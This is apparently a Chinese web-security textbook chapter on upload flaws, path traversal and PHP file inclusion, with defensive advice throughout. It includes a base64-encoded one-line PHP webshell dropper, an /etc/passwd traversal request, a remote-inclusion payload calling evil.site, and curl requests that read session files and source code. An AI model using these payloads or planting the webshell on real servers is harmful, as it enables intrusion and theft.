# 第十一章
# 文件操作
## 文件上传和下载
### 文件上传和下载漏洞概述
有很多时候需要用户将文件上传到服务器，如上传图片、认证材料，或者实名认证的证件照片。
最简单的文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务端命令的能力。网上有大量存在上传漏洞的web组件，比如旧版本的FCKEditor，对文件的后缀名限制不严，攻击者可以上传文件到服务器，获取服务器权限。
旧版本的PHP(PHP 5.3.4以下)还存在 "\0"字符截断的问题。C语言以"\0"作为字符串结束符，而PHP用专门的结构体来表示字符串，结构体中存储了字符串的长度，所以PHP中的字符串允许"\0"字符。如果攻击者上传一个"1.php\0.jpg"的文件，在PHP中会通过文件后缀名的白名单校验，但是底层C语言库在写入文件时，将"\0"作为字符串结束符，实际上写入的是"1.php"的文件。
与文件上传和下载有关的问题还有很多：
1、上传的文件是web脚本，服务器的web容器解释并执行了用户上传的脚本，导致代码执行。一些应用只对文件后缀名进行校验，如果只是在前端JS代码中进行校验，是无效的。另外，服务端根据文件的Content-Type来判断文件类型也是不可靠的，因为客户端可以随意填充这些值。有些应用在服务端使用后缀名黑名单校验方式，但是没有覆盖所有危险的后缀名。如，IIS支持执行以".CER"，".CDX"，".ASA"等为后缀名的文件，在有些Apache+PHP环境中，为了兼容旧版PHP会做如下配置：
```
<FilesMatch "\.ph(p[2-6]?|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>    
```
那么如果以".php2"，".php3"等为后缀名的文件也能被当作PHP脚本来解析。
2、如果服务端会对上传的文件做进一步的处理，那么攻击者构造恶意的畸形文件可能会威胁服务端。例如，XML文件可能产生外部实体注入，恶意构造的ZIP压缩包可能产生"解压炸弹"，消耗服务器资源。另外，部分图像、文档处理库本身存在漏洞，比如被广泛使用的图像处理库ImageMagick就出现过多个代码执行漏洞，攻击者上传恶意的图像可触发远程代码执行。
3、如果服务端允许上传网页文件，则会威胁网站的其他用户，如产生钓鱼攻击、XSS攻击等。低版本的IE浏览器存在自动判断HTTP响应内容类型的特性(Content sniffing)，如果攻击者上传一个图像文件，但是在文件头部插入HTML代码，IE浏览器访问这个图像时会把它当作HTML文件来解析，从而导致XSS攻击。
4、服务端未对文件做安全检测，或者未做内容校验，若允许公开下载文件，可能被攻击者利用来传播恶意文件。
5、上传的文件路径可预测，并且没有采取授权措施，则攻击者可访问其他用户的文件
6、web服务器如果支持PUT方法(如IIS开启了WebDAV扩展)，则会带来严重的安全问题。
7、在Windows系统中，攻击者利用NTFS文件系统的可选数据流(Alternate Data Stream)，可以让应用程序执行预期意外的功能。比如，攻击者指定上传一个文件名为"1.asp:.jpg"，服务端将创建文件名为"1.asp"的空文件，如果攻击者指定文件名为"1.asp::$Index_Allocation"，服务端将创建名为"1.asp"的目录
8、在允许上传压缩包的场景中，如果web应用会对文件解压并读取其中的文件进行操作，那么恶意构造的带软链接的压缩包可能让服务端实现任意文件读取，比如读取指定的包含敏感信息的文件。
9、网站上存在可公开访问的违法内容时，会面临监管风险，同时对网站SEO(Search Engine Optimization搜索引擎优化)也不利。
### 路径解析漏洞
多个web服务器程序都出现过与路径解析有关的漏洞，它们都曾造成非常大的安全影响。
Apache的web服务器支持文件多重后缀名的特性，使用AddHandler指令可以为一个文件类型添加多个处理器，如：
`AddHandler application/x-httpd-php .php`
如果一个文件有多重后缀名，Apache  HTTPD会按照从后往前的顺序查找，直到遇见认识的类型，所以一个名为"test.php.abc.def"的文件也会被当作PHP文件来解析。
在以CGI方式运行的PHP环境中，如nginx+PHP，如果PHP中配置类cgi.fix_pathinfo=1，PHP会尝试去查找请求访问的真实文件路径。这是为了支持伪静态的URL(例如/info.php/test)，因为这个文件是不存在的，它需要从后往前递归找到一个存在的文件来执行，此处即info.php。
如果攻击者上传一个带有PHP代码的图像文件，然后通过如下方式访问：
`/imgaes/photo.jpg/1.php`
nginx会认为这是在访问一个PHP文件，所以交给后端PHP程序来解析，如果PHP开启了fix_pathinfo特性，就会找到/images/photo.jpg文件，并把它当作PHP代码来解释执行，这就导致远程代码执行。这个问题在其他以CGI方式运行PHP环境中同样存在。
处理动态网页的方式有：`CGI、FastCGI、PHP-FPM、Servlet、Node.js、ASP.NET、Python WSGI、Ruby Rack`
PHP-FPM在后续的版本中添加了security.limit_exetensions配置，限制了只有后缀名在白名单中的文件可以执行，这个白名单的默认值是".php"和".phar"
另外，IIS也存在文件路径解析的问题。当文件名为"abc.asp;xx.jpg"时，IIS6会将此文件解析为"abc.asp"，文件名被截断，导致脚本被执行。
除了这个漏洞，在IIS6中还曾经出现过一个漏洞--因为处理文件夹扩展名时出错，导致/\*.asp*/目录下的所有问价都被作为ASP文件进行解析，比如访问/path/xyz.asp/abc.jpg，就会把abc.jpg当作ASP文件来执行。
这些漏洞都存在于低版本的web服务器中，官方已经修复了这些漏洞，开发者应当避免使用过低版本的web服务器程序。
### 文件上传和下载的安全
对于文件的上传和下载功能，我们可以从两个方面考虑其安全性：一是文件的路径信息，包括存放的域名、目录、文件名等信息；二是文件本身的内容
对于文件的路径信息，可以参考以下策略：
1、采用白名单严格校验其上传文件的后缀名。
2、为已上传的文件重命名，防止被覆盖，且生成的文件名要足够随机。
3、上传的文件尽量存储在专门的文件服务器或者对象存储服务中，而不是放在web应用所在的服务器上。文件存储使用单独的域名，方便分离静态资源，也能减少恶意文件的影响范围
4、对于高敏感级别的文件，不直接通过web服务器对外提供静态文件下载，而是在数据库中存储由ID到文件的映射关系通过web应用来实现文件下载，如/download.php?id=1234。这样就能更精细地控制文件下载，比如对下载操作进行认证和授权校验，但是无法享受CDN的好处
5、下载文件的响应头要加入"Content-Dispostion: Attachment"和X-Content-Type-Options:nosniff，防止低版本浏览器将文件当成HTML解析而引发XSS漏洞
6、不要使用过低版本的web服务器程序。
文件内容处理，有以下参考策略：
1、对于图像文件，在判断其是否为恶意文件时，不要尝试查找恶意脚本特征，而是使用图像处理库载入图像，在导出为新图像(二次渲染)。
2、对于Office或PDF文档，也可以使用响应的解析库读取其内容，并导出为新文件。
3、在安全要求更高的场景中，图像的裁剪、加水印、文档解析等工作，最好在隔离环境中进行。断网，使用容器运行等
### 命令写入一句话马
php 一句话木马
```
"fputs(fopen('dotast.php','w'),base64_decode(\"PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ 10pOw==\"));"
```
在system函数被过滤的时候，可以使用这个方式写入木马
## 对象存储的安全
随着云服务不断普及，越来越多的web应用使用对象存储作为静态文件存储，比如阿里云的OSS和腾讯云的COS。虽然云厂商的对象存储服务安全性非常高，有完善的签名校验机制，并且经过了严格的安全测试，但是如果开发者配置或使用不当，也可能产生严重的安全漏洞。
在对象存储中，文件是以键值对形式存在的，键是一个路径，值就是文件本身的内容。云厂商都提供了丰富的API来实现文件的上传和下载，并向用户提供一对AccessKeyID/AccessKeySecret用于认证和授权，调用对象存储时的API时使用AccessKeySecret对请求参数计算消息认证码(HMAC)，然后将其作为签名提交给服务端校验合法性。
对象存储中最基本的安全策略是对象和桶的读写ACL，敏感的文件一般被设置为"私有访问"，如果要将其提供给网页下载 ，则可以使用已签名的临时URL。如果应用中没有敏感文件的数据，并且确实有公开访问的需求，则可以将文件设置为"公开可读"的。很多对象也支持"公开可读写"。
为了方便客户端上传和下载文件，在web应用或移动App中使用对象存储时，一般让客户端直接访问对象存储服务，文件无须经过web应用服务端中转。一个很常见的错误用法是，开发人员直接将AccessKeyID/AccessKeySecret硬编码在前端或移动App中，在前端或者客户端完成签名过程。攻击者查看网页源代码，或者逆向分析移动App，就能获得AccessKeySecret，从而控制整个对象存储桶，下载或 删除其他用户的文件。
在这个场景中，安全的做法是使用临时访问凭证(STS)来访问对象存储服务。通过STS临时访问阿里云的OSS的过程。该过程中，应用服务器可以为STS凭证指定授权策略和过期时间，以限制客户端只能执行特定的操作，比如只能访问特定路径下的文件(限制键的前缀)。
即使使用了临时访问凭证，如果不同用户上传的文件存储在同一目录中，或者STS授权的策略不够严格，那么攻击者可以构造特定的文件名来覆盖已有的文件，达到修改其他用户文件的目的。下载文件也类似，攻击者可以读取其他用户的文件。所以，最重要的是为每个用户分配最小访问权限。
另一种客户端操作对象存储的方式是使用服务端签名，客户端用合法的签名直接访问对象存储。
这种做法签名全部在服务端完成，服务端可以对操作进行安全检查，再决定是否为其签名，因此比STS有更高的安全性。以读取私有桶的对象为例，客户端要通过如下请求从应用服务器获取一个访问目标的合法签名：
`https://example.com/get_signature?object=/path/filename`
应用服务器返回一个带合法签名的URL，客户端再用这个URL去访问对象存储：
`https://bucketname.cloudservice.com/path/filename?signature=******`
大量web应用使用存储对象实现上传和下载。这里存在一个非常常见的安全问题，因为操作对象是客户端指定的，如果服务端对路径没有做相应的安全校验，可让服务端生成读取或覆盖其他用户文件的合法签名，如果指定根路径，还会列出存储桶中所有的对象信息。
存储对象服务一般都支持绑定自定义域名，假如开发者将其用于存储 网站的静态资源，将存储桶绑定了自定义域名static.example.com，在上传文件时就要考虑文件格式和内容，否则攻击者上传包含了恶意JavaScript代码的网页时，将给网站带来XSS威胁。
## 路径穿越(Path Traversal)
在文件系统中，通过"../"可以访问上一级目录。所谓路径穿越，是指用户通过"../"的方式访问应用程序预期之外的目录。假设download.php实现了文件下载的功能，其代码如下：
```
<?php
$filename = $_GET['filename'];
echo file_get_contents("files/$filename");
?>
```
如果攻击者提交如下请求：
`/download.php?filename=../../../../etc/passwd`
应用程序将返回/etc/passwd文件的内容，这种攻击就叫做"路径穿越攻击"或"目录穿越攻击"漏洞。
如果应用程序中拼接了文件后缀名，也可以通过"\0"字符来截断后缀名。例如，用户提交filename=../../../../etc/passwd%00就能截断后面拼接的后缀名：
```
<?php
$filename = $_GET['filename'];
echo file_get_contents("files/$filename"+".jpg");
?>
```
最常见的路径穿越攻击就是任意文件读取，攻击者可以读取应用程序中包含的敏感数据的配置文件，或者源代码。另一种常见的路径穿越攻击是实现代码的执行，比如：
```
<?php
$template = 'blue.php';
if(is_set($_COOKIE['TEMPLATE']))
    $template = $_COOKIE['TEMPLATE'];
include ("/home/users/phpguru/templates".$template);;    
?>
```
攻击者实现上传一个包含PHP代码的图像文件，然后通过路径穿越让应用程序通过include()函数载入图像文件，从而实现任意代码执行。
有些开发者在防御路径穿越攻击时，只是简单判断用户传入的文件名或路径中是否存在".."，但是在应用程序没有做目录拼接的场景中，如果用户传入的文件名是以"/"开头的，将直接穿越到根目录，因此仍然存在"任意文件读取"漏洞。
在nginx中如果配置不正确，也存在任意路径穿越漏洞。如，在如下配置中：
```
location /i {
    alias /data/w3/imges/;
}
```
当用户访问/i../app/config.py时，实际上是读取的是/data/w3/images/../app/config.py，即/data/w3/app/config.py。原因是nginx在匹配到/i路径后，将后面的内容拼接到alias，但此时传入的是/i../，nginx并未意识到这是在跨目录，因而不会进行跨目录的相关处理。
正确的配置是，目录名以"/"结束：
```
location /i/{
    alias /data/w3/images/;
}
```
路径穿越的原理比较简单，可以采取如下防御方案：
在应用中尽量避免让用户直接提交文件名。更安全的做法是，维护一个ID与文件的映射关系，用户只需要提交索引ID
如果一定要用户提交文件名，则应该校验文件名的合法性，过滤目录分隔符"/"和"\"，更安全的做法是，只允许使用特定文件名或者特定的字符。
## 文件包含(File Inclusion)
文件包含漏洞主要出现在PHP和JSP应用中，如果应用在运行过程中会动态加载其他脚本文件，并且加载的文件路径由外部输入变量控制，就有可能产生文件包含漏洞。文件包含分为：本地文件包含(Local File Inclusion)和远程文件包含(Remote File Inclusion).
文件包含漏洞很多时候也是路径穿越漏洞，include函数其加载的文件就是由外部输入变量控制的，但是文件包含漏洞特指文件被web应用载入并执行。比如，PHP中用include()和require()函数载入文件并执行。另外JSP也支持类include操作:
`<jsp:include page="<%= (String)request.getParameter("ParamName")%>">`
此漏洞就是因此而得名的。
在允许文件上传的场景中，攻击者可以先上传恶意代码，再通过本地文件包含漏洞来执行代码。
远程文件包含是指应用可以通过一个URL加载并执行远程代码，比如PHP中include()就支持指定一个URL作为参数。以下代码就存在远程包含漏洞:
```
<?php
$incfile = $_REQUEST["filename"];
include($incfile.".php");
?>
```
攻击者提交如下参数，就能让服务端加载并执行远程恶意代码:
`filename=http://evil.site/fi`
利用远程文件包含漏洞，攻击者无须上传恶意文件至目标服务器，只需要将其放在远程服务器上即可。
除了执行恶意代码，攻击者还可以通过本地文件包含漏洞读取或执行其他文件，进而获取服务器上的敏感数据，或者让应用执行错误的逻辑。
如果PHP应用中存在文件包含漏洞，攻击者可以读取Session中的数据。在默认配置下，PHP将Session存储在文件系统中，默认路径为/var/lib/sessions，用户通过文件包含就能读取属于自己的会话的内容，如果其中包含了不应该让用户知道的信息，将会造成信息泄漏。如，在图形验证码场景中，服务端在生成图像后，通常会将验证码的明文存储在Session中用于后续校验，攻击者通过文件包含漏洞读取明文验证码，就能绕过人机校验，实现程序自动化操作：
```
<?php
session_start();
$_SESSION['captcha'] = '9527';    //用于一个固定验证码作为演示
if(isset($_GET['filename']))
    include($_GET['filename']);
?>
```
攻击者提交的参数如下(后面的随机字符串是当前的SessionID)：
```
curl 'http://example.com/lfi.php?filename=../../../../../../var/lib/php/sessions/sess_621t0j12g57ium0kim1otv8a10'
captcha|s:4:"9527";
``` 
如果用户能够控制Session中的内容，比如web应用会将当前的用户名存储在Session中，并且用户名中允许存在特殊字符，那么攻击者设置如下的用户名，就可以通过文件包含漏洞远程执行代码：
`<?php phpinfo();?>`
除了Session外，用户可控的其他内容可以用于实现文件包含，如日志文件、临时文件、上传的文件等。
PHP还允许使用php://协议来访问各种I/O流，其中php://filter可以将过滤器应用到文件流中，对文件内容进行特定的编码。直接包含的代码文件会执行代码，但是通过php://filter过滤器可将代码编码曾其他格式，直接输出在响应中，从而获取源代码内容。例如：
```
curl 'http://example.com/lfi.php?filename=php:filter/convert.base64-encode/resource=lfi.php'
PD9waHAK...base646-encode
```
php://input流用于获取请求的Body内容，在读取文件时如果文件名可控，我们可以通过POST请求控制应用读取的内容。
在PHP文件包含中还可以使用data://、zip://、phar:// 等协议
利用文件包含漏洞也能实现拒绝服务攻击(Dos)，攻击者构造特定的路径或者URL，让服务端应用包含一个超大的文件，消耗服务器资源，影响服务器的正常运行。
```
http://example.com/rfi.php?filename=http://mirrors.163.com.ubuntu-releases/32.10/ubuntu-21.1-desktop-amd64.iso
```
文件包含漏洞的解决方案与路径穿越的类似，在执行"包含"操作时，如果有外部变量用于生成包含文件的路径，则应当严格校验参数的合法性。此外，即使不发生目录穿越，如果包含目录的其他文件，也可能产生其他预期外的行为。所以如果条件允许，应该尽量用白名单文件名的校验方式，或者维护一个由ID到文件名的映射关系，让客户端传入ID即可。
此外，绝大部分应用不会存在远程包含文件的需求，所以在PHP中可以通过设置allow_url_include=0，禁止远程加载文件。
在有些场景中，可以通过外部输入参数影响HTML页面加载JavaScript代码，也有人把这种漏洞称为文件包含，如：
```
<script src="<?php echo htmlspecialchars($_GET['url'],ENT_QUOTES);?>">
```
更多的时候我们把这种漏洞视为XSS漏洞，其对应的攻击是让网页包含攻击者指定的JavaScript文件，最终在浏览器 执行恶意代码，而不是在服务端执行。